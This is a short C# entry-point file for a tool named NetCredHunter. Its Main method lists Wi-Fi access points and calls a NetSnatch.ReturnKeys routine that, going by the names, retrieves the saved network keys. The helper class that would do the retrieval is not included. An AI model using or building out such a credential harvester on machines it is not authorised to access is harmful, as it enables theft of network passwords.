using System;
using System.Diagnostics;
using System.Collections.Generic;

namespace NetCredHunter
{
    public class Program
    {
        public static void Main(string[] args)
        {

            Process NetProc = new Process();
            List<String> APList = NetSnatch.ParseAPList(NetProc);
            NetSnatch.ReturnKeys(NetProc, APList);
        }

        public static string ReturnAPs()
        {
            string someoutput = null;

            Process NetProc = new Process();
            List<String> APList = NetSnatch.ParseAPList(NetProc);

            foreach (var AP in APList) { someoutput += $"{AP}\n"; }

            return someoutput;
        }

    }
}
